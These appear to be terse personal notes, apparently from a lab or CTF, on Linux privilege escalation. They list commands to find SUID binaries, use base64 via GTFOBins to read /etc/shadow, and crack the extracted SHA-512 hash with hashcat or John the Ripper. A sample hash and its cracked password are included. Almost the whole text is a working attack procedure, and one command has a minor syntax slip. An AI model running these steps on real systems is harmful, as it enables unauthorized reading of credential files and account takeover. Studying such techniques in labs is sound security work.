https://gtfobins.github.io/ 

to find all functions with the SUID bit
> find / -type f -perm -04000 -ls 2>/dev/null

identify one that is applicable in GTFObins

example
base 64

> LFILE=file_to_read
  - this looked like this for me
>LFILE=/etc/shadow
>base64 "LFILE" | base64 --decode

which gave me all the hashes
- from here you can go one of 2 ways
  - hashcat
  - john the ripper

 Hashcat
  - extract the hashfrom the shadow file
  user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:19124:0:99999:7:::

- cut it down to only the hash:
$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb

run hashid (unless hashtype is known)
> hashid -m hashFile.txt
> this returned sha-512 (m 1800)
> hashcat -m 1800 hashFile rockyou.txt
- $6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:Password1

## John the Ripper
> unshadow <PASSWD_FILE> <SHADOW_FILE> > <OUTPUT_FILENAME.TXT>
> john --wordlist=</PATH/TO/WORDLIST.TXT> <UNSHADOWED_FILE.TXT>
> john --show <UNSHADOWED_FILE.TXT>




